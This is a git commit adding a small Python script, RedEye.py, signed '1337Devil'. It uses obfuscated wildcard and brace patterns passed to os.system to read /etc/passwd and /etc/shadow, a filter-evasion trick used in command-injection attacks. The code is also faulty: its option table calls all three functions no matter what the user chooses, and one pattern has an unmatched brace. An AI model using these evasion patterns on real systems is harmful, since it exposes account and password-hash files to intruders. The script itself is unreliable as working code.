29700e93ffbc8039f3a1c90ee679f4ab85a9b68b
Abdulaziz1337 <53045352+1337Devil@users.noreply.github.com>
2019-07-18 15:47:00 +0300

    Add files via upload

---
+++ RedEye.py
@@ -0,0 +1,28 @@
+# Coded By 1337Devil :)
+# import os command ..
+import os
+
+# import pyfiglet module
+import pyfiglet
+
+ascii_banner = pyfiglet.figlet_format("1337Devil")
+print(ascii_banner)
+
+
+def a():
+    return os.system('{/***/ca*,/**c/****wd}')
+def b():
+    return os.system('/***/[c][a]* /**[c]/*****[d]')
+def c():
+    return os.system('/***/ca*,/**c/****ow}')
+def op(x) :
+    switcher={
+        1: a(),
+        2: b(),
+        3: c(),
+    }
+    return switcher.get(x, "your option not available")
+print("Press 1 Or 2 to read passwd file , and 3 to read shadow file ")
+n=int(input("Enter your Choice: "))
+c=op (n)
+print(c)
